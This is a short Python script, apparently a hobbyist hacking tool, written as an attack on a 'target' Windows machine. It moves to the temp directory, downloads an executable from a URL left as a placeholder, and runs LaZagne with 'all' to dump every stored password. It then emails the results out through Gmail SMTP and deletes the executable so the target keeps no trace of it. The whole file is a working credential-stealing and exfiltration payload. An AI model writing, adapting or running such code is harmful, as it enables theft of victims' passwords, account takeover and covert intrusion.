

import requests
import subprocess
import smtplib, os, tempfile



def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("file url  which u want to excute")
# lazagne is app which will collect  al passwords stored in target desktop
result = subprocess.check_output("lazagne.exe all", shell=True) # excute lazahne command
send_mail("email", "password", result)
os.remove("lazagne.exe")   # after excuting commands deleting exe from target pc